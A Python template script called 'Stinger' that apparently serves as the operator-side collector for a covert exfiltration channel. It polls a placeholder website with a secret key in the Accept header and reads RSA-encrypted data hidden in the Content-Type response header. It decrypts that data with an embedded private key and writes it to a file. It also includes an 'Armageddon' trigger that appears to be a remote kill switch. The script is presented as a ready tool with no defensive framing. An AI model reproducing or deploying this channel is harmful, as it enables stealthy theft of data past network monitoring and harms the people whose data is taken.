# Libraries
import requests, argparse, rsa, threading
from rsa import PrivateKey
# Initialization
parser = argparse.ArgumentParser()
parser.add_argument("-sp", "--stingerPath", help="File Path", required=False, default="output.txt")
parser.add_argument("-sa", "--stingerArmageddon" ,help="Armageddon (True/False)", required=False, default="FALSE")
parser.add_argument("-sv", "--stingerVerbose", help="Verbose (True/False)", required=False, default="TRUE")
parser.add_argument("-st", "--stingerThreads", help="Threads", required=False, type=int, default=4)
# Read arguments from command line
args = parser.parse_args()
# Header
headers = {
    "Accept": "{{getKey}}",
}
# Starting Point
start = {{tableBegin}}
# Private key
privateKey = {{privateKey}}

try:
    # Armageddon
    if(args.stingerArmageddon.upper() == "TRUE"):
        request = requests.get("{{website}}",params={"ARMAGEDDON":"{{armageddonKey}}"},headers=headers)
        if(request.status_code == 200):
            print("Armageddon Successful")
            exit(0)
    
    # Retriving data
    def runStinger():
        global start
        while True:
            request = requests.get("{{website}}",params={"{{tableID}}":start},headers=headers)
            if(request.status_code == 200 and str(request.headers.get("Content-Type")) != "None"):
                requestData = bytearray(bytes.fromhex(request.headers.get("Content-Type")))
                requestData = rsa.decrypt(requestData, privateKey).decode() + "\n"
                # Writing data to file
                file = open(args.stingerPath, "a")
                file.write(requestData)
                if(args.stingerVerbose.upper() == "TRUE"):
                    print("Data : " + requestData)
                start = start + 1
            else:
                if(request.status_code != 200 and args.stingerVerbose.upper() == "TRUE"):
                    print("Request Failed : " + str(request.status_code))
                elif(args.stingerVerbose.upper() == "TRUE"):
                    print("No Data")
                exit(1)
    
    # Threading
    def runStingerThreads():
        for i in range(args.stingerThreads):
            thread = threading.Thread(target=runStinger)
            thread.start()
            thread.join()
    
    # Run threads
    runStingerThreads()

except Exception as e:
    print("Error : " + str(e))
    exit(1)